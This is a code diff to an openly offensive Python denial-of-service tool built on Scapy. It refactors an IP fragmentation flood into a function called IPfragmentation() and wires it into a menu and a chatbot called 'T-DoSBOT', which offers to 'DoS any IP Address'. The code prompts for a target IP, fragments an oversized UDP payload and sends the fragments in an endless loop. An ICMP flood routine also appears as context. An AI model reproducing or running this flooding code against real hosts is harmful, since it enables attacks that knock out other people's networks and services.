@@ -74,6 +74,22 @@ def Icmpflood():
 
     for x in range (0,int(cycle)):
         send(IP(dst=targetip)/ICMP())
+def IPfragmentation():
+    dip=str(input("Target IP: "))
+    payload="A"*496+"B"*500
+    packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
+                    
+    global fragment
+    frags=fragment(packet,fragsize=500)
+                    
+    counter=1
+    for fragment in frags:
+        print("Packet Number: "+str(counter))
+        print("===================================================")
+        fragment.show() #displays each fragment
+        counter+=1
+        while(1):
+            send(fragment)
 
 def main():
     os.system("clear")
@@ -168,20 +184,7 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-        dip=str(input("Target IP: "))
-        payload="A"*496+"B"*500
-        packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
-        global fragment
-        frags=fragment(packet,fragsize=500)
-
-        counter=1
-        for fragment in frags:
-            print("Packet Number: "+str(counter))
-            print("===================================================")
-            fragment.show() #displays each fragment
-            counter+=1
-            while(1):
-                send(fragment)
+        IPfragmentation()
     elif option == 8:
         print("T-DoSBOT: Hi, i'm T-DoSBOT, a simple ChatBot to help you DoS/DDoS! You can ask me to DoS any IP Address by just simply typing DOS; BUT before that...")
         name = input("Whats your name?: ")
@@ -227,23 +230,9 @@ def main():
                     Icmpflood()
                 elif ccc == "7":
                     print("T-DoSBOT: Ok, i'm gonna IP Fragment " + victim)
-                    dip=str(input("Target IP: "))
-                    payload="A"*496+"B"*500
-                    packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
-                    
-                    global fragment
-                    frags=fragment(packet,fragsize=500)
-                    
-                    counter=1
-                    for fragment in frags:
-                        print("Packet Number: "+str(counter))
-                        print("===================================================")
-                        fragment.show() #displays each fragment
-                    counter+=1
-                    while(1):
-                        send(fragment)
-                    else:
-                        print("T-DoSBOT: Sorry, i don't understand that command :(")
+                    IPfragmentation()
+                else:
+                    print("T-DoSBOT: Sorry, i don't understand that command :(")
         else:
             print("T-DoSBOT: Sorry, i don't understand that command :(")
 if __name__ == "__main__":
